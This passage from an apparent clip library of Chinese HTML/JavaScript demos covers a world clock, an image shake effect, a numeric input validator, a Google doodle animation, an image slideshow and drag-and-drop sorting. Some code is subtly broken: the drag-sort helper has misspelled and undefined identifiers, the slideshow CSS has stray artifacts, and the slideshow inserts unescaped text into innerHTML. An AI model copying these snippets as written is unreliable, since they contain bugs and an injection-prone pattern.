		<input id="state" type="hidden" />
		<input id="txtID" type="text" onclick='openKeyboard("txtID");' />
		<div id="keyboardParent"></div>
	</body>
</html>
#T=时钟
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style> 
<!--
@import url(css-cn.css);
-->
</style>
<title>世界时钟</title>
</head>
 
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<br>
<form name="clock">
  <table align="center" cellpadding="0" cellspacing="0" height="253" bordercolordark="white" bordercolorlight="black" background="worldmap.jpg" width="680" style="font-size:9pt">
	<tr>
		
	  <td  height="34" align="center"> <font color="#FF6633"><strong>世界时钟</strong></font> 
	  </td>
	</tr>
	<tr> 
	  <td align="center">北京时间:  
		<input type="text" size="8" name="local">
		</td>
	</tr>
	<tr>
		
	  <td width="877" height="199" align="center" valign="top"> 
		<table width="680" border="1" cellspacing="0" bordercolorlight="black" bordercolordark="white" style="font-size:9pt">
		  <tr bgcolor="#CCCCCC"> 
			<td width="58" height="24" align="center"> 夏威夷 </td>
			<td width="62" align="center"> 阿拉斯加 </td>
			<td width="71" align="center"> 太平洋时间 </td>
			<td width="90" align="center"> 美国山地时间 </td>
			<td width="85" align="center"> 美国中部时间 </td>
			<td width="82" align="center"> 美国东部时间 </td>
			<td width="65" align="center"> 大西洋时间 </td>
			<td width="56" align="center"> 巴西 </td>
			<td width="73" align="center"> 大西洋-中部 </td>
		  </tr>
		  <tr> 
			<td width="58" align="center"> GMT-10 </td>
			<td width="62" align="center"> GMT-9 </td>
			<td width="71" align="center"> GMT-8 </td>
			<td width="90" align="center"> GMT-7 </td>
			<td width="85" align="center"> GMT-6 </td>
			<td width="82" align="center"> GMT-5 </td>
			<td width="65" align="center"> GMT-4 </td>
			<td width="56" align="center"> GMT-3 </td>
			<td width="73" align="center"> GMT-2 </td>
		  </tr>
		  <tr> 
			<td width="58" align="center"> <input type="text" size="8" name="Hawaii"> 
			</td>
			<td width="62" align="center"> <input type="text" size="8" name="alaska"> 
			</td>
			<td width="71" align="center"> <input type="text" size="8" name="pacif"> 
			</td>
			<td width="90" align="center"> <input type="text" size="8" name="mount"> 
			</td>
			<td width="85" align="center"> <input type="text" size="8" name="center"> 
			</td>
			<td width="82" align="center"> <input type="text" size="8" name="east"> 
			</td>
			<td width="65" align="center"> <input type="text" size="8" name="atl"> 
			</td>
			<td width="56" align="center"> <input type="text" size="8" name="bra"> 
			</td>
			<td width="73" align="center"> <input type="text" size="8" name="mid"> 
			</td>
		  </tr>
		  <tr bgcolor="#999999"> 
			<td height="3" colspan="9" align="center"><br>
<br>
			  <br>
 </td>
		  </tr>
		  <tr bgcolor="#CCCCCC"> 
			<td width="58" height="20" align="center"> 伦敦 </td>
			<td width="62" align="center"> 柏林 </td>
			<td width="71" align="center"> 开罗 </td>
			<td width="90" align="center"> 莫斯科 </td>
			<td width="85" align="center"> 新德里 </td>
			<td width="82" align="center"> 曼谷 </td>
			<td width="65" align="center"> 香港 </td>
			<td width="56" align="center"> 东京 </td>
			<td width="73" align="center"> 悉尼 </td>
		  </tr>
		  <tr> 
			<td width="58" align="center"> GMT </td>
			<td width="62" align="center"> GMT +1 </td>
			<td width="71" align="center"> GMT +2 </td>
			<td width="90" align="center"> GMT +3 </td>
			<td width="85" align="center"> GMT +5 </td>
			<td width="82" align="center"> GMT +7 </td>
			<td width="65" align="center"> GMT +8 </td>
			<td width="56" align="center"> GMT +9 </td>
			<td width="73" align="center"> GMT +10 </td>
		  </tr>
		  <tr> 
			<td width="58"> <input type="text" size="8" name="_GMT"> </td>
			<td width="62"> <input type="text" size="8" name="rome"> </td>
			<td width="71"> <input type="text" size="8" name="Israel"> </td>
			<td width="90"> <input type="text" size="8" name="msw"> </td>
			<td width="85"> <input type="text" size="8" name="del"> </td>
			<td width="82"> <input type="text" size="8" name="kok"> </td>
			<td width="65"> <input type="text" size="8" name="ho"> </td>
			<td width="56"> <input type="text" size="8" name="tky"> </td>
			<td width="73"> <input type="text" size="8" name="sdn"> </td>
		  </tr>
		</table>
		</td>
	</tr>
	<tr>
		
	  <td width="877" height="2" align="center"> </td>
	</tr>
</table>
</form>
<script language="JavaScript"> 
<!-- Begin
function GetTime() {
var dt = new Date();
var def = dt.getTimezoneOffset()/60;
var gmt = (dt.getHours() + def);
document.clock.local.value = (IfZero(dt.getHours()) + ":" + IfZero(dt.getMinutes()) + ":" + IfZero(dt.getSeconds()));
var ending = ":" + IfZero(dt.getMinutes()) + ":" +  IfZero(dt.getSeconds());
var rome =check24(((gmt + 1) > 24) ? ((gmt + 1) - 24) : (gmt + 1));
document.clock.rome.value = (IfZero(rome) + ending);
var isr =check24(((gmt + 2) > 24) ? ((gmt + 2) - 24) : (gmt + 2));
document.clock.Israel.value = (IfZero(isr) + ending);
var msw =check24(((gmt + 3) > 24) ? ((gmt + 3) - 24) : (gmt + 3));
document.clock.msw.value = (IfZero(msw) + ending);
var del =check24(((gmt + 5) > 24) ? ((gmt + 5) - 24) : (gmt + 5));
document.clock.del.value = (IfZero(del) + ending);
var kok =check24(((gmt +7 ) > 24) ? ((gmt +7 ) - 24) : (gmt + 7));
document.clock.kok.value = (IfZero(kok) + ending);
var ho =check24(((gmt + 8) > 24) ? ((gmt + 8) - 24) : (gmt + 8));
document.clock.ho.value = (IfZero(ho) + ending);
var tky =check24(((gmt + 9) > 24) ? ((gmt + 9) - 24) : (gmt + 9));
document.clock.tky.value = (IfZero(tky) + ending);
 
var sdn =check24(((gmt + 10) > 24) ? ((gmt + 10) - 24) : (gmt + 10));
document.clock.sdn.value = (IfZero(sdn) + ending);
var _GMT =check24(((gmt) > 24) ? ((gmt) - 24) : (gmt));
 
document.clock._GMT.value = (IfZero(_GMT) + ":" + IfZero(dt.getMinutes()) + ":" + IfZero(dt.getSeconds()));
var haw =check24(((gmt + (24-10)) > 24) ? ((gmt + (24-10)) - 24) : (gmt + (24-10)));
document.clock.Hawaii.value = (IfZero(haw) + ending);
var ala =check24(((gmt + (24-9)) > 24) ? ((gmt + (24-9)) - 24) : (gmt + (24-9)));
document.clock.alaska.value = (IfZero(ala) + ending);
var pacif =check24(((gmt + (24-8)) >= 24) ? ((gmt + (24-8)) - 24) : (gmt + (24-8)));
document.clock.pacif.value = (IfZero(pacif) + ending);
var mount =check24(((gmt + (24-7)) > 24) ? ((gmt + (24-7)) - 24) : (gmt + (24-7)));
document.clock.mount.value = (IfZero(mount) + ending);
var center =check24(((gmt + (24-6)) > 24) ? ((gmt + (24-6)) - 24) : (gmt + (24-6)));
document.clock.center.value = (IfZero(center) + ending);
var east =check24(((gmt + (24-5)) > 24) ? ((gmt + (24-5)) - 24) : (gmt + (24-5)));
document.clock.east.value = (IfZero(east) + ending);
var atl =check24(((gmt + (24-4)) > 24) ? ((gmt + (24-4)) - 24) : (gmt + (24-4)));
document.clock.atl.value = (IfZero(atl) + ending);
var bra =check24(((gmt + (24-3)) > 24) ? ((gmt + (24-3)) - 24) : (gmt + (24-3)));
bra = (bra >= 24) ? bra - 24 : bra;
document.clock.bra.value = (IfZero(bra) + ending);
var mid =check24(((gmt + (24-2)) > 24) ? ((gmt + (24-2)) - 24) : (gmt + (24-2)));
mid = (mid >= 24) ? mid - 24 : mid;
document.clock.mid.value = (IfZero(mid) + ending);
setTimeout("GetTime()", 1000);
}
function IfZero(num) {
return ((num <= 9) ? ("0" + num) : num);
}
function check24(hour) {
return (hour >= 24) ? hour - 24 : hour;
}
javascript:GetTime();
//  End -->
</script></body>
</html>
#T=鼠标移至图片后抖动
<head><title>鼠标移至图片后抖动的JS代码 </title></head><BODY>
<style>.shakeimage{position:relative; left:100px; top:100px;}</style>
<img src=http://img.baidu.com/hi/logo/logo_93_30.gif class="shakeimage" onMouseover="shake(this,'onmouseout')" >
<script language="JavaScript1.2">
var typ=["marginTop","marginLeft"],rangeN=10,timeout=20;
function shake(o,end){
    var range=Math.floor(Math.random()*rangeN);
    var typN=Math.floor(Math.random()*typ.length);
o["style"][typ[typN]]=""+range+"px";
var shakeTimer=setTimeout(function(){shake(o,end)},timeout);
o[end]=function(){clearTimeout(shakeTimer)};
}
</script>
</body></html>
#T=数字输入验证 onkeydown
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
	<script type="text/javascript">
	<!--
		function validateDigitsOnly(evt) {
			var e = evt || window.event,
			key = e.keyCode || e.which;
			if
				(
					!e.shiftKey && !e.altKey && !e.ctrlKey &&
					// Backspace, Tab, Enter
					key == 8 || key == 9 || key == 13 ||
					// Home, End
					key == 35 || key == 36 ||
					// <-, -> 方向键
					key == 37 || key == 39 ||
					// Del, Ins
					key == 46 || key == 45
				) {
				return;
			}
			var el = e.target || e.srcElement,
			// 最大数字长度
			nl = el.getAttribute("data-numbers") || 15,
			// 最大小数长度
			dl = el.getAttribute("data-decimals") || 2,
			val = el.value,
			// "." 位置
			dotIndex = val.indexOf("."),
			rng = caret.call(el),
			// 光标在"."左边
			rLeft = rng.end <= dotIndex,
			// 光标在"."右边
			rRight = rng.begin > dotIndex;
			if
				(
					// 数字   
					key >= 48 && key <= 57 ||
					// 数字键盘输入的数字
					key >= 96 && key <= 105
				) {
					if (validateValue(dotIndex, val, rLeft, rRight, nl, dl)) {
						return;
					}
					// 选中部分文本再做一次处理
					val = val.substring(0, rng.begin) + val.substring(rng.end);
					dotIndex = val.indexOf(".");
					if (validateValue(dotIndex, val, rLeft, rRight, nl, dl)) {
						return;
					}
			}
			else if
				(
					// ".", ","
					(key == 190 /*|| key == 188*/ ||
					// 数字键盘上的 ".", ","
					key == 109 /*|| key == 110*/) &&
					// 允许输入小数
					dl > 0
				) {
					if
					(
						// 未输入".", 且输入的位置后面的小数位数未达到上限
						dotIndex == -1 && (rng.end == val.length || val.substring(rng.end).length <= dl) ||
						// 输过".", 且选中部分文本包含"."
						dotIndex > -1 && rng.begin <= dotIndex && dotIndex < rng.end
					) {
						return;
					}
			}
			return false;
		}
		// 验证输入的值
		function validateValue(dotIndex, val, rLeft, rRight, nl, dl) {
			if
				(
					// 未输入过"."
					dotIndex == -1 && val.length < nl ||
					// 光标位置在"."之前
					rLeft && val.substring(0, dotIndex).length < nl ||
					// 光标在"."之后且未达到小数上限
					rRight && val.substring(dotIndex + 1).length < dl
				) {
					return true;
				}
			 return false;
		}
		// 获取光标位置
		function caret() {
			var begin, end;
			if (this.setSelectionRange) {
				begin = this.selectionStart;
				end = this.selectionEnd;
			} else if
				(document.selection && document.selection.createRange) {
				var range = document.selection.createRange();
				begin = 0 - range.duplicate().moveStart('character', -100000);
				end = begin + range.text.length;
			}
			return { begin: begin, end: end };
		}
	//-->
	</script>
</head>
<body>
	<input type="text" onkeydown="return validateDigitsOnly(event)" />
	<input type="text" onkeydown="return validateDigitsOnly(event)" />
</body>
</html>

#T=跳舞 google dance js
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<meta name="generator" content="editplus" />
	<meta name="author" content="" />
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<base href="http://www.google.com/logos/2011/">
	<script type="text/javascript">
	<!--
		(
			function ()
			{
				try
				{
						var google = {};
						if (!google.doodle)
						{
							google.doodle = {};
						}
						var d =
							[
								[307, 48, 88, 89], [307, 48, 89, 89], [307, 48, 91, 89], [305, 49, 93, 89], [305, 50, 93, 88],
								[305, 50, 93, 88], [306, 52, 92, 86], [305, 53, 93, 84], [305, 54, 94, 83], [306, 54, 93, 83],
								[307, 54, 92, 83], [307, 54, 92, 83], [308, 54, 90, 83], [308, 54, 90, 83], [306, 53, 91, 84],
								[306, 53, 91, 84], [308, 53, 90, 84], [308, 53, 90, 84], [305, 53, 92, 84], [305, 52, 92, 85],
								[306, 52, 91, 85], [308, 51, 88, 87, 1], [308, 50, 88, 88], [308, 49, 88, 88], [307, 49, 89, 88],
								[307, 50, 89, 87], [308, 51, 89, 86], [307, 54, 90, 83], [307, 57, 90, 80], [306, 58, 92, 79],
								[306, 58, 92, 79], [305, 60, 92, 77], [302, 61, 95, 76], [302, 63, 95, 74], [302, 51, 96, 86],
								[302, 66, 98, 71], [304, 67, 96, 69], [301, 63, 96, 74], [301, 58, 93, 79], [291, 52, 94, 85],
								[288, 50, 71, 88], [285, 43, 76, 95], [285, 37, 70, 101], [281, 29, 55, 109], [278, 20, 58, 119],
								[278, 20, 55, 119, 1], [277, 12, 121, 127], [271, 2, 122, 138], [267, 1, 126, 139], [264, 0, 136, 140],
								[260, 0, 141, 140], [255, 0, 148, 140], [252, 0, 151, 140], [249, 2, 121, 138], [247, 3, 123, 137],
								[246, 3, 123, 137], [246, 2, 124, 137], [258, 2, 112, 137], [263, 2, 106, 137], [263, 2, 106, 137],
								[262, 2, 103, 137], [260, 2, 104, 136], [260, 2, 104, 137, 1], [268, 2, 98, 137], [267, 2, 99, 137],
								[266, 2, 97, 137], [266, 3, 96, 136], [264, 3, 99, 136], [263, 3, 100, 136], [261, 3, 100, 136],
								[259, 2, 138, 137], [254, 2, 126, 137], [247, 2, 101, 136], [240, 2, 108, 136], [238, 1, 110, 137],
								[230, 1, 118, 138], [220, 15, 128, 124], [211, 18, 137, 121], [205, 43, 102, 96], [202, 45, 104, 93],
								[200, 38, 97, 101], [198, 38, 104, 101, 1], [197, 39, 107, 100], [197, 39, 112, 100], [213, 39, 94, 110],
								[212, 40, 95, 111], [211, 41, 97, 111], [209, 42, 99, 112], [209, 43, 98, 112], [213, 43, 87, 112],
								[213, 42, 83, 113], [211, 40, 86, 109], [211, 38, 86, 103], [211, 37, 88, 112], [211, 20, 186, 131],
								[213, 27, 167, 122], [212, 44, 87, 105], [210, 44, 88, 98], [195, 44, 106, 98], [189, 44, 110, 98],
								[182, 46, 117, 99], [173, 44, 118, 96, 1], [161, 43, 130, 99], [154, 42, 137, 97], [153, 42, 137, 97],
								[153, 42, 137, 97], [152, 41, 137, 98], [151, 41, 137, 97], [149, 41, 145, 97], [148, 25, 144, 114],
								[148, 13, 144, 126], [141, 12, 153, 127], [115, 11, 173, 128], [108, 7, 180, 133], [108, 4, 180, 136],
								[108, 3, 176, 137, 1], [108, 1, 161, 139], [105, 1, 235, 138], [103, 1, 295, 148], [103, 0, 277, 149],
								[108, 0, 234, 137], [101, 0, 232, 137], [99, 0, 135, 139], [95, 0, 244, 139], [81, 0, 152, 139],
								[69, 0, 164, 139, 1], [66, 0, 169, 139], [65, 0, 170, 139], [63, 0, 168, 138], [61, 0, 159, 138],
								[35, 0, 304, 139], [19, 0, 189, 140], [18, 11, 138, 129], [18, 11, 137, 129], [18, 11, 137, 128],
								[18, 6, 135, 133], [7, 4, 146, 136], [6, 4, 147, 136], [3, 4, 150, 136, 1], [3, 5, 150, 135],
								[3, 8, 150, 132], [4, 6, 394, 145], [12, 6, 388, 145], [11, 8, 389, 144], [11, 8, 387, 144],
								[11, 8, 387, 143, 1], [10, 8, 113, 131], [11, 8, 111, 131], [10, 9, 112, 130], [12, 9, 116, 130],
								[12, 9, 111, 130], [12, 9, 111, 130], [12, 9, 110, 131], [12, 34, 113, 106], [13, 35, 110, 104]
							],
					e = d.length,
					f,
					g,
					h,
					i,
					j = -1,
					l = function ()
					{
						var a = d[f],
						c = document.getElementById("hplogo");
						if (c && a[0])
						{
							var b = document.createElement("div");
							b.id = "hplogo" + f;
							b.style.left = a[0] + "px";
							b.style.top = a[1] + "px";
							b.style.width = a[2] + "px";
							b.style.height = a[3] + "px";
							b.style.background = "url(graham11-hp-sprite.png) no-repeat " + -g + "px " + -h + "px";
							a[3] > i && (i = a[3]);
							a[4] ? (g = 0, h += i, i = 0) : g += a[2];
							c.appendChild(b); ++f;
							f < e && (j = window.setTimeout(l, 83))
						}
					},
					m = function ()
					{
						google.doodle.a = !1;
						i = h = g = f = 0;
						j != -1 && (window.clearTimeout(j), j = -1);
						for (var a = 0; a < e; ++a)
						{
							var c = document.getElementById("hplogo" + a);
							c && c.parentNode && c.parentNode.removeChild(c)
						}
						j = window.setTimeout(l, 83)
					};
					if (!google.doodle.a)
					{
						google.doodle.a = !0;
						var n = document.createElement("img");
						n.addEventListener ? n.addEventListener("load", m, !1) : n.attachEvent("onload", m);
						n.src = "graham11-hp-sprite.png"
					}
				}
				catch (o)
				{
					//google.ml
						//(
							//o,
							//!1,
							//{
								//cause: "DOODLE"
							//}
						//)
					alert(o);
				};
			}
		)
		();
	//-->
	</script>
</head>
<body>
	<style>
		#hplogo
		{
			background : white;
			cursor : pointer;
			height : 156px;
			position : relative;
			width : 403px
		}
		#hplogo
			div
			{
				pointer-events : none;
				position : absolute
			}
	</style>
	<div id="hplogo">
		<!-- 动画容器 -->
	</div>
</body>
</html>
#T=图片切换 滤镜效果
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>图片切换效果</title>
<style type="text/css">
^#idPicShow img {}{
    width:265px;
    height:200px;
    border:1px solid #eee;
}
^#idPicText {}{
    background:#eee;
    line-height:25px;
    text-align:center;
    font-weight:bold;
    width:267px;
    white-space:nowrap;
    overflow:hidden;
    font-size:12px;
}
^#idPicText a {}{
    text-decoration:none;
    color:#333;
}
^#idPicList img {}{
    cursor:pointer;
    width:65px;
    height:50px;
    filter:alpha(opacity=50);
    -moz-opacity: .5;
    opacity: .5;
    border:0;
    margin:10px;
}
^#idPicList img.on {}{
    filter:alpha(opacity=100);
    -moz-opacity: 1;
    opacity: 1;
}
</style>
<script type="text/javascript">
var isIE = (document.all) ? true : false;

var $ = function (id) {
    return "string" == typeof id ? document.getElementById(id) : id;
};

var Class = {
  create: function() {
    return function() {
      this.initialize.apply(this, arguments);
    }
  }
}

Object.extend = function(destination, source) {
    for (var property in source) {
        destination[property] = source[property];
    }
    return destination;
}

//ie only
var TransView = Class.create();
TransView.prototype = {
  initialize: function(arrList, idShow, idList, idText, options) {
    if(!arrList || arrList.length == 0) return;
    
    var oThis = this, oShow = $(idShow), oList = $(idList), oText = $(idText), img = document.createElement("img"), a = document.createElement("a");
    
    //初始化显示区域
    img.src = "javascript:;"; a.target = "_blank"; if(isIE){ img.style.filter = "revealTrans(duration=1)"; };
    a.appendChild(img); oShow.appendChild(a);

    this._oList = oList;
    this._oText = oText;
    this._list = arrList;
    this._img = img;
    this._a = a;
    this._timer = null;
    this._index = -1;
    
    this.SetOptions(options);
    
    this.Time = Math.abs(this.options.Time);
    this.Auto = !!this.options.Auto;
    this.ClassOn = this.options.ClassOn;
    this.ClassOff = this.options.ClassOff;
    
    this.Set();
  },
  //设置默认属性
  SetOptions: function(options) {
    this.options = {//默认值
      ClassOn:        "",//显示时样式
      ClassOff:        "",//不显示时样式
      Auto:            true,//是否自动切换
      Time:            3000//切换时间
    };
    Object.extend(this.options, options || {});
  },
  //设置
  Set: function() {
    this.Each(function(list, i){
        var oThis = this, img = document.createElement("img");
        
        img.src = list["img"];
        img.alt = list["text"];
        img.onmouseover = function(){ oThis.Show(i); };
        img.onmouseout = function(){ if(oThis.Auto){ oThis._timer = setTimeout(function(){ oThis.Run(); }, oThis.Time); } };
        
        this._list[i]["obj"] = img;
        
        //这里封装的不好
        this._oList.appendChild(img);
    });
    
    this.Run();
  },
  //显示
  Show: function(i) {
    this.Stop();
    
    if(i < 0 || i >= this._list.length) i = 0;

    if(isIE){
        this._img.filters.revealTrans.Transition = Math.floor(Math.random() * 23);
        this._img.filters.revealTrans.apply();
        this._img.filters.revealTrans.play();
    }
    
    this._img.src = this._list[i]["img"];
    this._img.alt = this._list[i]["text"];
    
    if(!this._list[i]["url"]){
        this._oText.innerHTML = this._list[i]["text"];
        this._a.removeAttribute("href");
    } else {
        this._oText.innerHTML= "<a href='" + this._list[i]["url"] + "' target='_blank'>" + this._list[i]["text"] + "</a>";
        this._a.href = this._list[i]["url"];
    }
    
    if(this._index >= 0) this._list[this._index]["obj"].className = this.ClassOff;
    this._list[i]["obj"].className = this.ClassOn;
    this._index = i;
  },
  //开始
  Run: function() {
    this.Show(this._index + 1);
    if(this.Auto){ var oThis = this; this._timer = setTimeout(function(){ oThis.Run(); }, oThis.Time); }
  },
  //停止
  Stop: function() {
    clearTimeout(this._timer);
  },
  //
  Each:function(fun) {
    for (var i = 0, len = this._list.length; i < len; i++)
        fun.call(this, this._list[i], i);
  },
  //添加
  Add:function(img, text, url) {
    this.Stop();
    var len = this._list.length;
    this._list[len] = {'img': img, 'text': text, 'url': url }
    this._oList.innerHTML = "";
    
    this.Set();
  },
  //
  Delete:function(index) {
    index--;
    if(index < 0 || index > this._list.length) return;
    
    this.Stop();
    var _arr = [];
    var m =0;
    
    this.Each(function(list, i){ if(i != index)    _arr[m++] = list; });
    this._list = _arr;
    this._oList.innerHTML = "";
    
    this.Set();
  }
};
</script>
</head>
<body>
<div id="idPicShow"></div>
<div id="idPicText"></div>
<div id="idPicList"> </div>
<div style="clear:both;"> 图片url：<br />
  <input id="textImg" type="text" value="http://car.fs12345.com/UploadFile/2008520163714.jpg" />
  <br />
  说明：<br />
  <input id="textText" type="text" value="韩国车模是玉女还是欲女" />
  <br />
  链接地址：<br />
  <input id="textUrl" type="text" value="http://car.fs12345.com/Htmls/auto/mm/20080520161608122.htm" />
  <br /><br />
  <input name="" type="button" value=" 添 加 " onclick="Add();" />
  <br /><br />
  <input name="" type="button" value=" 删 除 " onclick="Delete();" /> 第 <input id="textIndex" type="text" size="3" value="1" /> 个
</div>
<script>
var tv = new TransView([
        {'img':'http://car.fs12345.com/UploadFile/2008520163803.jpg', 'text':'雷诺梅甘娜推特别版', 'url':'http://car.fs12345.com/Htmls/auto/newcar/20080520161004009.htm'},
        {'img':'http://car.fs12345.com/UploadFile/200851084140.jpg', 'text':'全新MG名爵TF', 'url':'http://car.fs12345.com/Htmls/auto/newcar/20080510083439924.htm'},
        {'img':'http://car.fs12345.com/UploadFile/200841690403.jpg', 'text':'保时捷RS Spyder', 'url':'http://car.fs12345.com/Htmls/auto/mzsj/20080416085953966.htm'}
    ], "idPicShow", "idPicList", "idPicText", { ClassOn: "on" }
);

function Add(){
    tv.Add($("textImg").value, $("textText").value, $("textUrl").value);
}

function Delete(i){
    var i = $("textIndex").value;
    if(!isNaN(i)) tv.Delete(parseInt(i));
}
</script>
</body>
</html>
#T=拖拽排序
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1">
	<title></title>

</head>
<body>
	<div style="text-align:center;margin:0 auto; width:250px;height:200px; background-color:Red;">
		<div id="woshi" style="width:120px;height:200px; background-color:Red; float:left;">
			<div id="Div1" class="droggle" style="width:120px;height:50px; background-color:yellow;">1
			</div>
			<div id="Div2" class="droggle" style="width:120px;height:50px; background-color:yellow;">2</div>
			<div id="Div3" class="droggle" style="width:120px;height:50px; background-color:yellow;">3</div>
		</div>
		<div id="Div4" style="width:120px;height:200px; background-color:Red;float:right;">
			<div id="Div5" class="droggle" style="width:120px;height:50px; background-color:yellow;">1
			</div>
			<div id="Div6" class="droggle" style="width:120px;height:50px; background-color:yellow;">2</div>
			<div id="Div7" class="droggle" style="width:120px;height:50px; background-color:yellow;">3</div>
		</div>
	</div>
<script language="javascript">
(function (window) {
	var regId = /^#[\w\-]+$/,
	regCls = /^.[\w\-]+$/,
	p_silice = Array.prototype.slice,
	p_push = Array.prototype.push,
	markArr = function (obj) {
		return p_silice.call(obj, 0);
	};
	function MWood(selector) {
		return new MWood.prototype.init(selector);
	};

	function MWood(selector, context) {
		return new MWood.prototype.init(selector, context);
	}

	MWood.prototype = {
		init: function (selector) {
			if (regId.test(selector)) {
				this.length = 1;
				this[0] = document.getElementById(selector);
				return this;
			}
			else if (regCls.test(selector)) {
				if (document.querySelectorAll) {
					p_push.apply(this, markArr(document.querySelectorAll(selector)));
				} else {
					var len = documenet.getElementsByTagName('*').length,
					clsArr = [],
					el, i = 0,
					selector = selector.replace(/\-/g, "\\-");
					var oRegExp = new RegExp("(^|\\s)" + selector + "(\\s|$)");

					for (; i < len; i++) {
						el = els[i];
						if (oRegExp.test(el[type])) {
							clsArr.push(el);
						}
					}

					pro_push.apply(this, markArr(clsArr));
					return this;
				}
			}
		},
		length: 0
	}

	MWood.prototype.init.prototype = MWood.prototype;

	MWood.extend = function (obj) {
		for (var o in obj) {
			this[o] = obj[o];
		}
	}

	MWood.extend({
		addHandle: function (elm, type, fn) {
			if (elm.addEventListener) {
				elm.addEventListener(type, fn, false);
			}
			else if (el.attachEvent) {
				elm.attachEvent("on" + type, fn);
			} else {
				elm["on" + type] = fn;
			}
		},
		removeHandle: function (elm, type, fn) {
			if (elm.removeEventListener) {
				elm.removeEventListener(type, fn, false);
			}
			else if (el.detachEvent) {
				elm.detachEvent("on" + type, fn);
			} else {
				elm["on" + type] = null;
			}
		},
		getEvent: function (evnet) {
			return evnet ? evnet : window.evnet;
		},
		getTarget: function (event) {
			return event.target || event.srcElement;
		}
	});

	window.MWood = MWood;

})(this);

window.onload = function () {
	var dragDrop = function () {
		var dragInfo = {};   //存放有关拖拽对象的一些信息
		function handleEvent(event) {
			e = MWood.getEvent(event);  //获得事件
			var target = MWood.getTarget(event); //获得事件对象
			switch (event.type) {   //判断事件类型
				case "mousedown":
					if (target.className.indexOf("droggle") > -1) {
						dragInfo.dObj = target;   //存放事件对象
						var tlwh = getObjtlwh(target); //获得对象的 offsetTop,offsetLeft,offsetWidth,offsetHeight
						//计算出鼠标的坐标与对象offsetTop,offsetLeft的差值以便于鼠标移动时实时定位拖拽对象的位置
						target.x = e.clientX - tlwh[1];
						target.y = e.clientY - tlwh[0];

						//修改对象的position以便可以设置left和top进行拖拽 从这里开始此对象已经脱离文档流
						//何为文档流 当怎么样设置position或别的设置会脱离文档流请百度
						target.style.position = "absolute";

						//设置拖拽对象的left top width height
						target.style.left = (e.clientX - target.x) + "px";
						target.style.top = (e.clientY - target.y) + "px";
						target.style.width = tlwh[2] + "px";
						target.style.height = tlwh[3] + "px";

						//建立一个新对象填补被拖拽对象的位置，这样页面就还会按现在的排版，不会有任何更改。
						//如果没创建，被拖拽对象的位置就会被文档流上的其他对象占用，文章最后提供代码，可以注释掉下面4句试下两种情况
						dragInfo.vObj = document.createElement("div");
						dragInfo.vObj.style.width = target.style.width;
						dragInfo.vObj.style.height = target.style.height;
						target.parentNode.insertBefore(dragInfo.vObj, target);
					}
					break;
				case "mousemove":
					if (dragInfo.dObj) {  //当鼠标移动的时候判断时候已经有对象存在（对象会在mousedown的时候存放进这个变量里）
						//设置拖拽对象的left和top改变位置，因为position已经在mousedown的时候改变为absolute了（鼠标坐标-保存的差值）
						dragInfo.dObj.style.left = (e.clientX - dragInfo.dObj.x) + "px";
						dragInfo.dObj.style.top = (e.clientY - dragInfo.dObj.y) + "px";

						//获取class为droggle的一组HTMl对象.Array.prototype.slice.call是给一个伪数组转为真正的数组用的,MWood(".droggle")就是取得class为droggle的一组对象
						var arr = Array.prototype.slice.call(MWood(".droggle"), 0);

						//循环对象
						for (var i = 0; i < arr.length; i++) {
							if (arr[i] === dragInfo.dObj)  //过滤拖拽对象
								continue;
							var tlwh = getObjtlwh(arr[i]); //获得对象的 offsetTop,offsetLeft,offsetWidth,offsetHeight

							//下面就主要是判断鼠标的位置是否为引起页面上各HTML元素在页面上位置的替换
							//判断鼠标x > 对比对象offsetLeft && x < （对比对象的offsetWidth + 对象对象offsetLef）。 鼠标的坐标y同理鼠标坐标x的判断
							//判断位置变换也可以按自己的标准来，我百度的时候看到例子里是这样判断我就直接像他那样写了
							if (e.x > tlwh[1] && e.x < (tlwh[1] + tlwh[2]) && e.y > tlwh[0] && e.y < (tlwh[0] + tlwh[3])) {
								if (e.y < ((tlwh[0] + tlwh[3]) / 2)) {
									arr[i].parentNode.insertBefore(dragInfo.vObj, arr[i]);
									break;
								}
								else {
									if (!arr[i].nextSibling) {
										arr[i].parentNode.appendChild(dragInfo.vObj);
										break;
									}
									else {
										arr[i].parentNode.insertBefore(dragInfo.vObj, arr[i].nextSibling);
										break;
									}
								}
							}
						}
					}
					break;
				case "mouseup":
					if (dragInfo.dObj) {
						//把拖拽对象重新弄进文档流（static就是默认的值），替换临时占位的对象，并初始化dragInfo；
						dragInfo.dObj.style.position = "static";
						dragInfo.vObj.parentNode.insertBefore(dragInfo.dObj, dragInfo.vObj);
						dragInfo.dObj.parentNode.removeChild(dragInfo.vObj);
						dragInfo = {};
					}
					break;
			}
		};

		//绑定事件
		MWood.addHandle(document, "mousedown", handleEvent);
		MWood.addHandle(document, "mousemove", handleEvent);
		MWood.addHandle(document, "mouseup", handleEvent);
	} ();
};

function getObjtlwh(o) {
	var arr = [];
	arr[0] = o.offsetTop;
	arr[1] = o.offsetLeft;
	arr[2] = o.offsetWidth;
	arr[3] = o.offsetHeight;
	return arr
}
</script>

</body>
</html>

#T=新浪UC
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title> new document </title>
<meta name="generator" content="editplus" />
<meta name="author" content="" />
<meta name="keywords" content="" />
